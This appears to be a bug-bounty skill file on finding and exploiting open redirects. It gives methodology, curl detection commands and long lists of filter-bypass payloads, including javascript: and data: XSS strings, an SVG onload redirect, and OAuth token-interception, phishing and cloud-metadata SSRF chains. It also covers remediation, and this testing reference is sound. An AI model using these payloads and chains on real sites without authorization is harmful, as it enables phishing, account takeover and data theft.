---
name: "open-redirect"
version: "2.1"
category: "injection"
subcategory: "open-redirect"
phase: "exploitation"
tags: ["bug-bounty", "injection", "open-redirect", "phishing", "oauth", "chain", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["burp-repeater", "nuclei", "seclists", "oralyzer", "openredirex", "arjun", "authz", "autorize", "burp", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["ssrf", "xss", "sqli", "ssti", "phishing"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: open redirect - exploitation phase, injection category"
---
# Open Redirects

## Summary

Open redirects occur when a web application takes a user-supplied URL parameter and trusts it to redirect users to a new location without proper validation. While frequently tagged as low severity, open redirects are valuable as a force multiplier — they amplify the impact of other vulnerabilities, bypass security filters, and enable attack chaining for critical payouts.

## Attack Surface

### Server-Driven Redirects

- HTTP 3xx `Location` header-based redirects

### API Redirect Endpoints

APIs can issue unvalidated redirects based on user-controlled input in request bodies, not just query params — common in SSO and payment flows:

```
POST /api/redirect
{ "url": "https://evil.com/phish" }

POST /api/payment/return
{ "callback_url": "https://evil.com/cb" }
```

If the API issues a 302 to any URL, chain it for phishing or OAuth token theft (use the trusted domain's open redirect as the OAuth `redirect_uri`). Fuzz JSON body keys: `url`, `redirect`, `returnTo`, `callback`, `callback_url`, `return_url`, `next`, `destination`.

### Client-Driven Redirects

- `window.location`, meta refresh, SPA routers

### OAuth/OIDC/SAML Flows

- `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `returnTo`/`continue`/`next`

### Multi-Hop Chains

- Only first hop validated; subsequent hops escape constraints

### High-Value Targets

- Login/logout, password reset, SSO/OAuth flows
- Payment gateways, email links, invite/verification
- Unsubscribe, language/locale switches
- `/out` or `/r` redirectors

## Key Concepts

- **Open Redirect**: A vulnerability where an application accepts a user-controlled parameter (e.g., `?next=/dashboard`) and redirects the browser to that location without validating the destination.
- **Force Multiplier**: The redirect itself is often harmless, but it can be weaponized to elevate other bugs (phishing, SSRF, OAuth token theft, etc.).
- **Trust Assumption**: The root cause is trusting user-supplied input to determine the redirect target without proper validation (whitelist, regex, etc.).
- **URL Parser Differential**: Browser URL parsers and server-side URL parsers often interpret the same string differently, enabling bypass techniques.

## Technical Details

Basic example of a vulnerable redirect:

```
Legitimate:   https://trusted-site.com/login?redirect=https://trusted-site.com/dashboard
Malicious:    https://trusted-site.com/login?redirect=https://evil.com
```

An attacker replaces the intended destination with a malicious site.

Browsers interpret `//` as `http://` when no protocol is present. Characters like `@`, `\`, `#`, `%00`, and unicode dots can confuse both server-side and client-side URL parsers, making open redirect filters bypassable.

### Modern Browser Behaviors

- **Chrome 120+ Restrictions**: Enhanced protection against cross-site redirects; test if app relies on specific redirect chains
- **SameSite Cookie Implications**: `SameSite=Lax` default affects redirect flows; test authentication state preservation
- **Referrer-Policy Impact**: `no-referrer` or `strict-origin` may break redirect detection; test logging/analytics dependencies
- **COOP/COEP Headers**: Cross-Origin-Opener-Policy can break popup-based OAuth flows
- **Fenced Frames**: New iframe replacement affects redirect chains in isolated contexts

### CDN/Reverse Proxy Quirks

- Mixed scheme parsing (`https;`) accepted upstream but normalized downstream
- Double decode at different layers (edge vs origin) enabling `%252F` style bypass
- Header-driven redirects (`X-Original-URL`, `X-Forwarded-Proto`) abused through misconfigured proxies

### Mobile Deep Links

- Open redirects can escalate to app link hijack on mobile
- Test `intent:` URLs on Android and iOS universal link fallbacks
- Validate package/bundle IDs and enforce App Links/Universal Links verification

## Methodology

1. **Identify redirect endpoints** — Search in Burp for keywords: `redirect`, `return`, `continue`, `next`, `url`, `goto`, `target`, `dest`, `destination`, `redir`, `redirect_uri`, `redirect_url`, `view`, `to`, `image_url`, `go`, `returnTo`, `return_to`, `checkout_url`, `return_path`, `out`, `load`, `burl`, `link`, `src`, `location`, `forward`, `forward_url`, `callback_url`, `jump`, `jump_url`, `originUrl`, `origin`, `desturl`, `page`, `action`, `action_url`, `sp_url`, `service`, `recurl`, `uri`, `qurl`, `login`, `logout`, `clickurl`, `goto`, `rit_url`, `pic`, `u`, `u1`.

2. **Check where user input flows** — Use Burp Repeater; modify the parameter and see if the redirect target changes.

3. **Test with an external domain** — Replace the value with `https://evil.com`. If the browser redirects there, it's confirmed.

4. **Attempt bypasses** — If filtered, try protocol-relative (`//evil.com`), `@` symbol, double encoding, `/\`, `https:evil.com`, `%00` null byte, unicode dots, parameter pollution, backslash variants, IP format obfuscation, hex/octal/decimal IP representations, and URL-encoded characters.

5. **Check for server-side vs client-side redirects** — Server-side: check `Location:` header in responses. Client-side: search for `window.location = param` in JS.

6. **Test privileged flows** — After login, after OAuth authentication, password reset flows, email verification flows, payment gateways, logout flows.

7. **Test SVG file upload endpoints** — If the application allows SVG uploads, inject an `onload` event that redirects via JavaScript.

8. **Fuzz using wordlists** — Use SecLists or Oralyzer to brute-force open redirect parameters and paths with payload variants.

### Framework-Specific Redirect Vulnerabilities

- **Spring MVC**: improper handling of `url` parameter — `/spring/login?url=https://attacker.com`
- **Laravel**: unvalidated redirect in `redirect()` helper — `/redirect?url=https://attacker.com`
- **Express.js**: unvalidated `res.redirect()` — `/login?redirect=https://attacker.com`
- **Next.js (App Router)**: Server Action redirect abuse — `/api/action?redirect=https://attacker.com`
- **SvelteKit**: `goto()` and `redirect()` manipulation in hooks — `/auth/callback?redirectTo=https://attacker.com`
- **Remix**: loader/action redirect injection — `/login?redirectTo=https://attacker.com`
- **Astro**: `redirect()` in API routes — `/api/redirect?url=https://attacker.com`

### OAuth/SAML Redirect Testing

- **Implicit Flow**: `redirect_uri` missing validation — `/oauth/authorize?response_type=token&redirect_uri=https://attacker.com`
- **Authorization Code Flow**: improper `state` parameter handling — `/oauth/callback?code=ABC123&state=https://attacker.com`
- **Social Login**: Facebook `return_url`, Google `redirect_uri` manipulation
- OAuth/SSO stacks increasingly require exact `redirect_uri` match; test for partial/path-only allowlists and case/encoding mismatches

### Post-Authentication and URL Shortener Testing

- Test redirect parameters after login, password reset, email verification, payment gateways, logout flows
- For URL shorteners, test submitting `javascript:`, `data:`, and protocol-less (`//attacker.com`) URLs

### Weaponization

Once confirmed, chain the open redirect to:
- Bypass filter rules (domain allowlists trust the hostname, not the final redirect target)
- Steal OAuth tokens via redirect URI manipulation
- Deliver phishing pages from a trusted domain
- Chain with SSRF to bypass URL blocklists

## Key Vulnerabilities

### Allowlist Evasion

**Common mistakes:**

- Substring/regex contains checks: allows `trusted.com.evil.com`
- Wildcards: `*.trusted.com` also matches `attacker.trusted.com.evil.net`
- Missing scheme pinning: `data:`, `javascript:`, `file:`, `gopher:` accepted
- Case/IDN drift between validator and browser

**Robust validation:**

- Canonicalize with a single modern URL parser (WHATWG URL)
- Compare exact scheme, hostname (post-IDNA), and an explicit allowlist with optional exact path prefixes
- Require absolute HTTPS; reject protocol-relative `//` and unknown schemes

### OAuth/OIDC/SAML Redirect URI Abuse

- Using an open redirect on a trusted domain for `redirect_uri` enables code interception
- Weak prefix/suffix checks: `https://trusted.com` → `https://trusted.com.evil.com`
- Path traversal/canonicalization: `/oauth/../../@evil.com`
- `post_logout_redirect_uri` often less strictly validated

### Client-Side Vectors

- `location.href`/`assign`/`replace` using user input
- Meta refresh `content=0;url=USER_INPUT`
- SPA routers: `router.push(searchParams.get('next'))`

### Reverse Proxies and Gateways

- `Host`/`X-Forwarded-*` may change absolute URL construction
- CDNs that follow redirects for link checking can leak tokens when chained

### SSRF Chaining

- Server-side fetchers (web previewers, link unfurlers) follow 3xx
- Combine with an open redirect on an allowlisted domain to pivot to internal targets (`169.254.169.254`, `localhost`)

## Exploitation Scenarios

### OAuth Code Interception

1. Set `redirect_uri` to `https://trusted.example/out?url=https://attacker.tld/cb`
2. IdP sends code to `trusted.example` which redirects to `attacker.tld`
3. Exchange code for tokens; demonstrate account access

### Phishing Flow

1. Send link on trusted domain: `/login?next=https://attacker.tld/fake`
2. Victim authenticates; browser navigates to attacker page
3. Capture credentials/tokens via cloned UI

### Internal Evasion

1. Server-side link unfurler fetches `https://trusted.example/out?u=http://169.254.169.254/latest/meta-data`
2. Redirect follows to metadata; confirm via timing/headers

## Detection Commands

```
# Basic open redirect detection — check Location header
curl -sI "https://target.com/redirect?url=https://evil.com" | grep -i location

# Protocol-relative bypass
curl -sI "https://target.com/redirect?url=//evil.com" | grep -i location

# @-symbol bypass
curl -sI "https://target.com/redirect?url=https://evil.com@target.com" | grep -i location

# Backslash-forward-slash bypass
curl -sI "https://target.com/redirect?url=/\evil.com" | grep -i location

# Null byte bypass
curl -sI "https://target.com/redirect?url=https://target.com%00@evil.com" | grep -i location

# Check response for client-side redirect patterns
curl -s "https://target.com/redirect?url=evil.com" | grep -E "(window\.location|document\.location|window\.open)"
```

## Exploitation Payloads

### Whitelisted Domain / Keyword Bypass

```
www.whitelisted.com.evil.com
https://www.target01.com//example.com/
https://www.target01.com%09.example.com
https://www.target01.com%252e.example.com
```

### Protocol Bypasses

```
# Bypass "http" blacklist with //
//google.com

# Bypass "//" blacklist with https:
https:google.com

# Bypass "//" blacklist with escaped slashes
\/\/google.com/   browsers see // as //
/\/google.com/
```

### Backslash Bypass

```
/\google.com
```

### Character Encoding Bypasses

```
# Unicode full-width dot bypasses "." blacklist
//google%E3%80%82com

# Null byte terminates filter parsers early
//google%00.com
```

### Parameter Pollution

```
?next=whitelisted.com&next=google.com
```

### @-Symbol Bypass

```
http://www.theirsite.com@yoursite.com
```

### Path-Based Bypass

```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

### XSS from Open Redirect (JavaScript Context)

```
";alert(0);//
```

### data:// XSS via Open Redirect

```
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

### Username / Credential Confusion

```
https://www.victim.com@attacker.com
https://www.victim.co%6D@attacker.com
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com
```

### IP Format Obfuscation

```
# Regular
216.58.215.78

# Decimal
3627734862

# Octal
0330.0072.0327.0116

# Octal with junk zeros
00000330.00000072.00000327.00000116

# Hex
0xd83ad74e

# Hex (dot-separated)
0xd8.0x3a.0xd7.0x4e

# Hex (dot-separated) with junk zeros
0x000000d8.0x0000003a.0x000000d7.0x0000004e

# Mixed formats
http://00330.0x3a.54990
http://0xd8.072.54990
http://0xd8.3856078

# IPv6 mapped IPv4
http://[::216.58.214.206]
http://[::ffff:216.58.214.206]

# Octal overflows (out-of-range octets)
http://472.314.470.462
```

### Unicode Confusables (Enclosed Alphanumerics)

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```

### Open Redirect to XSS via javascript:

```
# Basic
javascript:alert(1)

# CRLF bypass for "javascript" word filter
java%0d%0ascript%0d%0a:alert(0)

# Double-encoded newline bypass (bypasses FILTER_VALIDATE_URL in PHP)
javascript://%250Aalert(1)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0

# Tab/space injections
%09Jav%09ascript:alert(document.domain)

# Backslash encoded
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

# Unicode encoded
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)

# Hex encoded
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)

# HTML entity encoded
Javas%26%2399;ript:alert(1)

# Octal encoded
\152\141\166\141\163\143\162\151\160\164\072alert(1)

# Whitelisted domain + newline
javascript://https://whitelisted.com/?z=%0Aalert(1)

# Tab + newline combo
%19Jav%09asc%09ript:https%20://whitelisted.com/%250Aconfirm%25281%2529

# Double-slash comment bypass
/x:1/:///%01javascript:alert(document.cookie)/
```

### SVG File Upload Open Redirect

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='http://www.example.com'"
xmlns="http://www.w3.org/2000/svg">
</svg>
```

### Additional Domain Bypass Payloads

```
<>//{target}
//;@{target}
/////{target}/
/////{target}
////{target}//
////{target}/
///\;@{target}
///{target}//
///{target}/
///{target}
//\/{target}/
//{target}//
//{target}/
//{target}
/.{target}
/\/{target}/
/〱{target}
.{target}
@{target}
\/\/{target}/
〱{target}
//{target}%00.{tld}
%01https://{target}
%01https://google.com
//{target}\twhitelisted.com/
```

## Commands

### Code Examples — Safe Redirect Patterns

**.NET**

```
response.redirect("~/mysafe-subdomain/login.aspx")
```

**Java**

```
response.redirect("http://mysafedomain.com");
```

**PHP**

```
<?php
header("Location: http://mysafedomain.com");
exit;
?>
```

## Tools

- **Burp Suite Active Scanner** — Automated open redirect detection
- **Burp Repeater** — Manual redirect testing
- **OWASP ZAP** — Open source scanner
- **Nuclei** — Open redirect templates (`open-redirect.yaml`)
- **DalFox** — Detects open redirect patterns in parameters
- **SecLists** — Wordlists at `SecLists/Fuzzing/Open-Redirect`
- **Oralyzer** — Open redirect fuzzer and analyzer — https://github.com/0xNanda/Oralyzer
- **IP Converter** — https://www.silisoftware.com/tools/ipconverter.php
- **OpenRedireX** — Specialized open redirect testing tool
- **Gxss** — Check for redirect XSS
- **Waybackurls** — Discover historical redirect endpoints
- **Param Spider** — Discover URL parameters

## Remediation Recommendations

- Use allowlists of permitted domains validated server-side (not client-side)
- Use indirect references — map user-supplied values to server-side pre-approved URLs via numeric IDs or tokens
- Create a warning page for external redirects with clear indicators of leaving the site
- Validate protocol (only http/https), domain against allowlist, use full URL parsing (not string checks)
- Implement CSRF protection for redirect endpoints
- For mobile deep links, validate package/bundle IDs and enforce App Links/Universal Links verification

## Bypass Techniques

### Domain Validation Bypasses

Using a whitelisted domain or keyword as a subdomain of the attacker domain:

```
www.whitelisted.com.evil.com
```

Using `//` to bypass `http` blacklisted keyword:

```
//google.com
```

Using `https:` to bypass `//` blacklisted keyword:

```
https:google.com
```

Using escaped `//` that browsers interpret as `//`:

```
\/\/google.com/
/\/google.com/
```

Using `/` to bypass:

```
/\google.com
```

Using `%E3%80%82` (full-width dot) to bypass `.` blacklist:

```
//google%E3%80%82com
```

Using `%00` null byte to bypass blacklist filter:

```
//google%00.com
```

Using parameter pollution (same param twice; one passes validation, second executes):

```
?next=whitelisted.com&next=google.com
```

Using `@` character (browser redirects to anything after `@`):

```
http://www.theirsite.com@yoursite.com/
```

Creating folder matching their domain:

```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

### URL Parser Confusion

Fragment confusion — browser ignores `#`, server-side parser may read differently:

```
https://trusted.com/login?redirect=https://evil.com#@trusted.com
```

Unicode normalization — characters normalized differently by parser vs browser:

```
https://trusted.com/login?redirect=https://evil。com
```

### IP Format Confusion

Bypass domain whitelist checks by representing the IP in non-standard formats:

```
# Regular
216.58.215.78

# Decimal integer
3627734862

# Octal
0330.0072.0327.0116

# Hex
0xd83ad74e

# Mixed — hex + octal
0xd8.072.54990

# IPv6 mapped IPv4
http://[::ffff:216.58.214.206]

# Overflow octets (out-of-range)
472.314.470.462
```

### Unicode Confusable Characters

Enclosed alphanumerics bypass domain parsers:

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
```

### JavaScript-Based Open Redirects

```
# Client-side redirect via hash or query params
window.location = params.get('redirect');
window.location.hash = params.get('url');
window.open(params.get('target'));
```

XSS from Open URL — if the redirect value is placed in a JS variable:

```
";alert(0);//
```

XSS from `data://` wrapper:

```
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

### Username / Credential Field Confusion

```
https://www.victim.com@attacker.com
https://www.victim.co%6D@attacker.com
```

### SVG Upload Open Redirect

If the application allows SVG file uploads, embed a redirect in the `onload` handler:

```xml
<svg onload="window.location='http://www.example.com'" xmlns="http://www.w3.org/2000/svg">
```

## Validation

- Produce a minimal URL that navigates to an external domain via the vulnerable surface; include the full address bar capture
- Show bypass of the stated validation (regex/allowlist) using canonicalization variants
- Test multi-hop: prove only first hop is validated and second hop escapes constraints
- For OAuth/SAML, demonstrate code/RelayState delivery to an attacker-controlled endpoint

## Not a Finding If

- **`Access-Control-Allow-Origin: *` without `Allow-Credentials`** — Not exploitable for credentialed requests.
- **Redirect is only to relative paths** — If the application only allows `/dashboard` or `../relative/path` and never accepts a protocol or hostname, it is likely not an open redirect.
- **Redirect target is validated against a strict whitelist with no bypass** — If the domain whitelist is robust and no encoding/parsing bypass works, the finding is a false positive.
- **Client-side redirect is in an uncontrolled variable** — If the redirect parameter value is not user-controllable (hardcoded or server-generated), there is no vulnerability.
- **Redirects constrained to relative same-origin paths with robust normalization** — No external navigation possible.
- **Exact pre-registered OAuth `redirect_uri` with strict verifier** — Full match with no parser differential.
- **Validators using a single canonical parser and comparing post-IDNA host and scheme** — No parser disagreement to exploit.
- **User prompts that show the exact final destination before navigating** — User has visibility into the target.

## Notes

- Open redirects are often dismissed as low severity but are highly valuable for chaining with other vulnerabilities.
- The real power is in using the trusted domain's redirect to trick filters, browsers, and users.
- Always test for open redirects when you see parameters that control navigation.
- Many open redirect bypasses rely on the difference between how server-side URL validators and browser URL parsers interpret the same string.
- Decoding/encoding chains (`%252e` → `%2e` → `.`) can bypass single-decode validation.

### Pro Tips

- Always compare server-side canonicalization to real browser navigation; differences reveal bypasses
- Try userinfo, protocol-relative, Unicode/IDN, and IP numeric variants early
- In OAuth, prioritize `post_logout_redirect_uri` and less-discussed flows; they're often looser
- Exercise multi-hop across distinct subdomains and paths
- For SSRF chaining, target services known to follow redirects
- Favor allowlists of exact origins plus optional path prefixes
- Keep a curated suite of redirect payloads per runtime (Java, Node, Python, Go)

### Impact

- Credential and token theft via phishing and OAuth/OIDC interception
- Internal data exposure when server fetchers follow redirects
- Policy bypass where allowlists are enforced only on the first hop
- Cross-application trust erosion and brand abuse

## References

- https://osintteam.blog/bug-bounty-bootcamp-13-open-redirects-the-hackers-ultimate-force-multiplier-bdab5f50c81d
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html
- https://github.com/cujanovic/Open-Redirect-Payloads

## Real-World Reports

### H1 #905607 — Open Redirect Leads to Account Takeover (cs.money, 336 upvotes)

**The `///` Bypass Technique:**

The site validated that a redirect URL must start with `https://cs.money`. Using triple slashes breaks this check:

```
https://cs.money///attacker.com
```

The browser parses this as `https://cs.money` → then `///attacker.com` (path), but server-side redirects to `https://attacker.com`. The attacker controls the destination.

**OAuth ATO Chain:**

1. Victim clicks: `https://cs.money///attacker.com?r=/oauth/callback`
2. Victim authenticates on cs.money
3. OAuth code/token sent to attacker's callback
4. Attacker exchanges code for tokens
5. Full account takeover via stolen OAuth tokens

**Key Lessons:**
- Always test `///` (triple slash) for redirect bypass
- Chain open redirects with OAuth flows for ATO
- Even "trusted domain starts with" checks can be bypassed with parsing quirks
- High payout potential: open redirect + OAuth = full account takeover

### H1 #1788006 — Open Redirect in Logout & Login (Expedia, $1,000)

**The Boolean Parameter Technique:**

Expedia had a `logout` parameter that was treated as a redirect destination:

```
GET /?logout=1 → normal logout
GET /?logout=https://evil.com → redirect to attacker
```

**No Validation:**
- No scheme check (accepted `https://`)
- No domain ownership validation
- No relative vs absolute URL distinction
- Anything after `?logout=` was trusted blindly

**Key Lessons:**
- **Always test boolean/status parameters as redirect endpoints**: `?logout=1`, `?success=true`, `?error=0`, `?logged_out=1`
- These are often overlooked by developers who think "it's just a flag"
- Replace boolean values with URLs and test
- High-value targets: logout, password reset, success/error callbacks
